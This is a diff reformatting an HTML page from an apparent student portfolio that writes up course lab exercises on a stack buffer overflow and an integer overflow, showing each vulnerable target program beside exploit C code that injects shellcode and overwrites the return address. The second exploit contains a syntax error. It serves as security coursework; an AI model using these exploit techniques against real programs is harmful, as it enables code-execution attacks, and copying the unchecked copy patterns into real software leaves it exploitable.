@@ -1,75 +1,67 @@
 <!DOCTYPE HTML>
-<!--
-	Landed by HTML5 UP
-	html5up.net | @n33co
-	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
--->
 <html>
-	<head>
-		<title>Eui Won Kim | Snowman</title>
-		<meta name="author" content="Eui Won Kim">
-		<meta charset="utf-8" />
-		<link rel="shortcut icon" href="images/logoblack.png" type="image/x-icon">
-		<meta name="viewport" content="width=device-width, initial-scale=1" />
-		<!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
-		<link rel="stylesheet" href="assets/css/main.css" />
-	</head>
-	<body>
-		<div id="page-wrapper">
+<head>
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
+	<title>Eui Won Kim | Snowman</title>
+	<meta content="Eui Won Kim" name="author" />
+	<link href="images/logoblack.png" rel="shortcut icon" type="image/x-icon" />
+	<meta content="width=device-width, initial-scale=1" name="viewport" /><!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
+	<link href="assets/css/main.css" rel="stylesheet" />
+</head>
+<body>
+<div id="page-wrapper"><!-- Header -->
+<header id="header">
+<h1 id="logo" style="margin-top: 5px"><a href="index.html"><img alt="" height="50px" src="images/johnekimlogo1.png" width="150px" /> </a></h1>
 
-			<!-- Header -->
-				<header id="header">
-					<h1 id="logo" style="margin-top: 5px"><a href="index.html"><img alt="" height="50px" src="images/johnekimlogo1.png" width="150px"/> </a></h1>
+<nav id="nav">
+<ul>
+	<li><a href="about.html"><b>About</b></a></li>
+	<li><a href="#"><b>Projects</b></a>
+	<ul>
+		<li><a href="routie.html">Routie</a></li>
+		<li><a href="snowman.html">Study Buddy</a></li>
+		<li><a href="web.html">Personal Website</a></li>
+		<li><a href="elm.html">Elm</a></li>
+		<li><a href="cse.html">Lab Waitlist</a></li>
+		<li class="opener" style="-webkit-user-select: none; cursor: pointer; white-space: nowrap; opacity: 1;"><a href="#" style="display: block;">Internet Security</a>
+		<ul class="dropotron level-1" style="-webkit-user-select: none; position: absolute; z-index: 1001; left: -167px; top: 103.703125px; opacity: 1; display: none;">
+			<li style="white-space: nowrap;"><a href="buffer.html" style="display: block;">Buffer &amp; Integer Overflow</a></li>
+			<li style="white-space: nowrap;"><a href="heap.html" style="display: block;">Heap Spray</a></li>
+			<li style="white-space: nowrap;"><a href="china.html" style="display: block;">China&#39;s Great Cannon</a></li>
+			<li style="white-space: nowrap;"><a href="worm.html" style="display: block;">XSS &amp; Profile Worm</a></li>
+		</ul>
+		</li>
+		<li><a href="cse.html">Recommendation Algorithm</a></li>
+	</ul>
+	</li>
+	<li><a href="resume.html"><b>Resume</b></a></li>
+	<li><a href="contact.html"><b>Contact</b></a></li>
+</ul>
+</nav>
+</header>
+<!-- Main -->
 
-				<nav id="nav">
-						<ul>
-							<li><a href="about.html"><b>About</b></a></li>
-							<li>
-								<a href="#"><b>Projects</b></a>
-								<ul>
-									<li><a href="routie.html">Routie</a></li>
-									<li><a href="snowman.html">Study Buddy</a></li>
-									<li><a href="web.html">Personal Website</a></li>
-									<li><a href="elm.html">Elm</a></li>
-									<li><a href="cse.html">Lab Waitlist</a></li>
-									<li class="opener" style="-webkit-user-select: none; cursor: pointer; white-space: nowrap; opacity: 1;">
-										<a href="#" style="display: block;">Internet Security</a>
-										<ul style="-webkit-user-select: none; position: absolute; z-index: 1001; left: -167px; top: 103.703125px; opacity: 1; display: none;" class="dropotron level-1">
-											<li style="white-space: nowrap;"><a href="buffer.html" style="display: block;">Buffer&Integer Overflow</a></li>
-											<li style="white-space: nowrap;"><a href="heap.html" style="display: block;">Heap Spray</a></li>
-											<li style="white-space: nowrap;"><a href="china.html" style="display: block;">China's Great Cannon</a></li>
-											<li style="white-space: nowrap;"><a href="worm.html" style="display: block;">XSS & Profile Worm</a></li>
-										</ul>
-									</li>
-									<li><a href="cse.html">Recommendation Algorithm</a></li>
-								</ul>
-							</li>
-							<li><a href="resume.html"><b>Resume</b></a></li>
-							<li><a href="contact.html"><b>Contact</b></a></li>
+<div class="wrapper style1" id="main">
+<div class="container">
+<header class="major">
+<h2><a><img alt="" height="154px" src="images/security.jpg" width="178px" /></a></h2>
 
-							
-						</ul>
-					</nav>
-				</header>
+<h2>Buffer Overflow.</h2>
+</header>
 
-			<!-- Main -->
-				<div id="main" class="wrapper style1">
-					<div class="container">
-						<header class="major">
-							<h2><a><img src="images/security.jpg" height="154px" width="178px" alt="" /></a>
-</h2>
-							<h2>Buffer Overflow.</h2>
-						</header>
-						
-							<p>For target 1, through gdb we found the buf is allocating 132 bit of memory to the staack so our arg has to be at least [132] +4 to over flow the buffer to where the return address is. We made our arg much bigger [150] and filled the whole arg with the adress of the beinning of the buf 0xbefffc50. Then we copied the shellcode into the beginning of our arg. So now the arg will have shellcode + 0xbefffc50(till end of arg) Now when we run sploit1, the attack string will have the correct shellcode in the beginning and over flow the correct address back to the shellcode. </p>
-							<div class="row">
-								<div class="6u 12u(xsmall)" style="float: left;">
-								<header >
-									<h2><br></h2>
-									<p>Target</p>
-									<pre width="800px"><code style="height: 600px">#include &#60;stdio.h&#62;
-#include &#60;stdlib.h&#62;
-#include &#60;string.h&#62;
+<p>For target 1, through gdb we found the buf is allocating 132 bit of memory to the staack so our arg has to be at least [132] +4 to over flow the buffer to where the return address is. We made our arg much bigger [150] and filled the whole arg with the adress of the beinning of the buf 0xbefffc50. Then we copied the shellcode into the beginning of our arg. So now the arg will have shellcode + 0xbefffc50(till end of arg) Now when we run sploit1, the attack string will have the correct shellcode in the beginning and over flow the correct address back to the shellcode.</p>
+
+<div class="row">
+<div class="6u 12u(xsmall)" style="float: left;">
+<header>
+<h2></h2>
+
+<p>Target</p>
+
+<pre width="800px">
+<code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
 
 int foo(char *arg)
 {
@@ -81,7 +73,7 @@ int main(int argc, char *argv[])
 {
   if (argc != 2)
     {
-      fprintf(stderr, "target1: argc != 2\n");
+      fprintf(stderr, &quot;target1: argc != 2\n&quot;);
       exit(EXIT_FAILURE);
     }
   foo(argv[1]);
@@ -89,20 +81,24 @@ int main(int argc, char *argv[])
 }
 
 									</code></pre>
-									</header>
-								</div>
-								<div class="6u 12u(xsmall)" style="float: right;">
-								<header >
-									<h2> <br></h2>
-									<p>Exploit</p>
-									<pre width="800px" ><code style="height: 600px">#include &#60;stdint.h&#62;
-#include &#60;stdio.h&#62;
-#include &#60;stdlib.h&#62;
-#include &#60;string.h&#62;
-#include &#60;unistd.h&#62;
-#include "shellcode.h"
+</header>
+</div>
+
+<div class="6u 12u(xsmall)" style="float: right;">
+<header>
+<h2></h2>
+
+<p>Exploit</p>
+
+<pre width="800px">
+<code>#include &lt;stdint.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &quot;shellcode.h&quot;
  
-#define TARGET "/tmp/target1"
+#define TARGET &quot;/tmp/target1&quot;
 #define OFFSET 132
  
 int main(void)
@@ -117,50 +113,53 @@ int main(void)
  
     int i;
  
-    for (i = 0; i < OFFSET; i++) {
+    for (i = 0; i &lt; OFFSET; i++) {
         *(ptr+i) = address;
     }
  
-    for(i = 0; i < strlen(shellcode); i++) {
+    for(i = 0; i &lt; strlen(shellcode); i++) {
         buf[i] = shellcode[i];
     }
  
     strcpy(arg1,buf);
  
-    if (0 > execve(TARGET, args, env))
-        fprintf(stderr, "execve failed.\n");
+    if (0 &gt; execve(TARGET, args, env))
+        fprintf(stderr, &quot;execve failed.\n&quot;);
  
     return 0;
 }
 
 									</code></pre>
-								</div>
-								
-								
-						
-								
-						</div>
+</header>
+</div>
+</div>
+</div>
+</div>
+<!-- Integer -->
 
-					</div>
-				</div>
-				
-				<!-- Integer -->
-				<div id="main" class="wrapper style1">
-					<div class="container">
-						<header class="major">
-							<h2>Integer Overflow.</h2>
-						</header>
-				</header>
-				
-				<p>The bug here is the count &#60; MAX_WIDGETS<br><br> MAX_WIDGETS was defined as 200 so we know that count had to be less than 200 in order to take advantage of the memcpy. The size of struct came out to 40 so our buf size was 40x200 = 8000 bytes. Buf size as [8000]+4. We found the correct negative integer by subtracting INT_MIN + some number that came out to around 8040.<br><br> Then we created a head string which contained the number "-2147483446" and the rest of the string was filled by the same concept in target1. Once this negative number allow us to pass through the bug, the shellcode is executed by jumping back to the beginning of the buf. </p>
-							<div class="row">
-								<div class="6u 12u(xsmall)" style="float: left;">
-								<header >
-									<h2><br></h2>
-									<p>Target</p>
-									<pre width="800px"  ><code style="height: 600px">#include &#60;stdio.h&#62;
-#include &#60;stdlib.h&#62;
-#include &#60;string.h&#62;
+<div class="wrapper style1" id="main">
+<div class="container">
+<header class="major">
+<h2>Integer Overflow.</h2>
+</header>
+
+<p>The bug here is the count &lt; MAX_WIDGETS<br />
+<br />
+MAX_WIDGETS was defined as 200 so we know that count had to be less than 200 in order to take advantage of the memcpy. The size of struct came out to 40 so our buf size was 40x200 = 8000 bytes. Buf size as [8000]+4. We found the correct negative integer by subtracting INT_MIN + some number that came out to around 8040.<br />
+<br />
+Then we created a head string which contained the number &quot;-2147483446&quot; and the rest of the string was filled by the same concept in target1. Once this negative number allow us to pass through the bug, the shellcode is executed by jumping back to the beginning of the buf.</p>
+
+<div class="row">
+<div class="6u 12u(xsmall)" style="float: left;">
+<header>
+<h2></h2>
+
+<p>Target</p>
+
+<pre width="800px">
+<code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
  
 struct widget_t {
   double w;
@@ -176,7 +175,7 @@ int foo(char *in, int count)
 {
   struct widget_t buf[MAX_WIDGETS];
  
-  if (count &#60; MAX_WIDGETS) 
+  if (count &lt; MAX_WIDGETS) 
     memcpy(buf, in, count * sizeof(struct widget_t));
  
   return 0;
@@ -189,7 +188,7 @@ int main(int argc, char *argv[])
  
   if (argc != 2)
     {
-      fprintf(stderr, "target3: argc != 2\n");
+      fprintf(stderr, &quot;target3: argc != 2\n&quot;);
       exit(EXIT_FAILURE);
     }
  
@@ -197,15 +196,15 @@ int main(int argc, char *argv[])
    * format of argv[1] is as follows:
    *
    * - a count, encoded as a decimal number in ASCII
-   * - a comma (",")
+   * - a comma (&quot;,&quot;)
    * - the remainder of the data, treated as an array
    *   of struct widget_t
    */
  
-  count = (int)strtoul(argv[1], &in, 10);
-  if (*in != ',')
+  count = (int)strtoul(argv[1], &amp;in, 10);
+  if (*in != &#39;,&#39;)
     {
-      fprintf(stderr, "target3: argument format is [count],[data]\n");
+      fprintf(stderr, &quot;target3: argument format is [count],[data]\n&quot;);
       exit(EXIT_FAILURE);
     }
   in++;                         /* advance one byte, past the comma */
@@ -215,20 +214,24 @@ int main(int argc, char *argv[])
 }
 
 									</code></pre>
-									</header>
-								</div>
-								<div class="6u 12u(xsmall)" style="float: right;">
-								<header >
-									<h2> <br></h2>
-									<p>Exploit</p>
-									<pre width="800px"><code style="height: 600px">#include &#60;stdint.h&#62;
-#include &#60;stdio.h&#62;
-#include &#60;stdlib.h&#62;
-#include &#60;string.h&#62;
-#include &#60;unistd.h&#62;
-#include "shellcode.h"
+</header>
+</div>
+
+<div class="6u 12u(xsmall)" style="float: right;">
+<header>
+<h2></h2>
+
+<p>Exploit</p>
+
+<pre width="800px">
+<code>#include &lt;stdint.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &quot;shellcode.h&quot;
  
-#define TARGET "/tmp/target1"
+#define TARGET &quot;/tmp/target1&quot;
 #define OFFSET 132
  
 int main(void){
@@ -238,8 +241,8 @@ int main(void){
 
     int i;
     long * = (long *) arg1;
-    for(i = 0; i &#60; 54; i++, ptr++){
-        if(i > 51)
+    for(i = 0; i &lt; 54; i++, ptr++){
+        if(i &gt; 51)
             *ptr = ADDY;
         else
             *ptr = 0xffffffff;
@@ -249,40 +252,25 @@ int main(void){
 }
 
 									</code></pre>
-								</div>
-								
-								
-						
-								
-						</div>
+</header>
+</div>
+</div>
+</div>
+</div>
+<!-- Footer -->
 
-					</div>
-				</div>
-				
+<footer id="footer">
+<ul class="icons">
+	<li><a class="icon alt fa-linkedin" href="https://www.linkedin.com/in/euiwonkim"><span class="label">LinkedIn</span></a></li>
+	<li><a class="icon alt fa-github" href="https://github.com/jeo1kim"><span class="label">GitHub</span></a></li>
+	<li><a class="icon alt fa-envelope" href="mailto:jeo1kim@gmail.com"><span class="label">Email</span></a></li>
+</ul>
 
-			<!-- Footer -->
-				<footer id="footer">
-					<ul class="icons">
-						<li><a href="https://www.linkedin.com/in/euiwonkim" class="icon alt fa-linkedin"><span class="label">LinkedIn</span></a></li>
-						<li><a href="https://github.com/jeo1kim" class="icon alt fa-github"><span class="label">GitHub</span></a></li>
-						<li><a href="mailto:jeo1kim@gmail.com" class="icon alt fa-envelope"><span class="label">Email</span></a></li>
-					</ul>
-					<ul class="copyright">
-						<li>&copy; Awesome Possom. All rights reserved.</li><li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
-						<li>Logo: <a href="Cargocollective.com/alicesung">Alice Sung Kim</a></ul>
-				</footer>
-
-		</div>
-
-		<!-- Scripts -->
-			<script src="assets/js/jquery.min.js"></script>
-			<script src="assets/js/jquery.scrolly.min.js"></script>
-			<script src="assets/js/jquery.dropotron.min.js"></script>
-			<script src="assets/js/jquery.scrollex.min.js"></script>
-			<script src="assets/js/skel.min.js"></script>
-			<script src="assets/js/util.js"></script>
-			<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
-			<script src="assets/js/main.js"></script>
-
-	</body>
+<ul class="copyright">
+	<li>&copy; Awesome Possum. All rights reserved.</li>
+	<li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
+</ul>
+</footer>
+</div>
+<!-- Scripts --><script src="assets/js/jquery.min.js"></script><script src="assets/js/jquery.scrolly.min.js"></script><script src="assets/js/jquery.dropotron.min.js"></script><script src="assets/js/jquery.scrollex.min.js"></script><script src="assets/js/skel.min.js"></script><script src="assets/js/util.js"></script><!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]--><script src="assets/js/main.js"></script></body>
 </html>
